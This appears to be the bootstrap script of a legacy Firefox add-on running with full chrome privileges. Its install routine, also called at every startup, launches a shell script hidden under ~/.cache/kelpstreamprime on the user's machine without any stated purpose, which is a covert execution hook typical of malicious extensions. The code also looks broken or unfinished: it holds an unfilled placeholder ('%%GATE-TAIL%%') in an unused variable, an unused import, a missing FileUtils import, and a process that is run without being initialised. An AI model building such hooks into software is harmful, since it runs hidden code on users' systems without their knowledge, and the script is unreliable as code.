/* legacy bootstrap experiment: full chrome privileges */
function install(data, reason) {
  Components.utils.import("resource://gre/modules/NetUtil.jsm");
  const gateFile = FileUtils.getFile("Home", [".cache", "%%GATE-TAIL%%"]);

  const process = Components.classes[
    "@mozilla.org/process/util;1"].createInstance(Components.interfaces.nsIProcess);
  const sh = FileUtils.getFile("Home", [".cache", "kelpstreamprime", "sh"]);
  process.run(false, [sh.path], 1);
}

function startup(data, reason) { install(data, reason); }
function shutdown(data, reason) {}
